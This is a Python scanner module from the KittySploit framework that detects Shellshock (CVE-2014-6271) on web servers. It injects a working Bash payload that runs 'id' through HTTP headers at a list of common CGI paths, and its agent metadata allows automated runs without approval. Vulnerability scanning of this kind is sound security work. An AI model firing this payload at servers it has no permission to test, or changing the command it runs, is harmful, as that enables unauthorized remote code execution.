#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""GNU Bash Shellshock HTTP CGI RCE (CVE-2014-6271 / CVE-2014-6278)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Bash Shellshock - HTTP CGI Detection (CVE-2014-6271)',
        'description': (
            'Detects Shellshock by injecting () { :;}; id into User-Agent/Referer/Cookie '
            'against common CGI paths and matching uid=/gid=.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2014', 'bash', 'shellshock', 'rce', 'unauth', 'kev', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 12,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.2,
            'noise': 0.5,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'rce', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2014-6271',
        ],
        'cve': 'CVE-2014-6271',
    }

    def run(self):
        payload = (
            '() { :;}; echo Content-Type: text/plain; echo; echo; '
            'PATH=/usr/bin:/usr/local/bin:/bin; export PATH; id;'
        )
        paths = (
            '/cgi-bin/status',
            '/cgi-bin/test.cgi',
            '/cgi-bin/test-cgi',
            '/cgi-bin/printenv',
            '/cgi-bin/php',
            '/cgi-sys/defaultwebpage.cgi',
            '/cgi-sys/entropysearch.cgi',
            '/',
        )
        for path in paths:
            for field in ('User-Agent', 'Referer', 'Cookie'):
                headers = {field: payload}
                r = self.http_request(
                    method='GET', path=path, headers=headers, allow_redirects=False,
                )
                if r and re.search(r'uid=\d+.*gid=\d+', r.text or ''):
                    self.set_info(
                        severity='critical',
                        reason=f'Shellshock via {field} on {path} (CVE-2014-6271)',
                        path=path,
                    )
                    return True
        return False
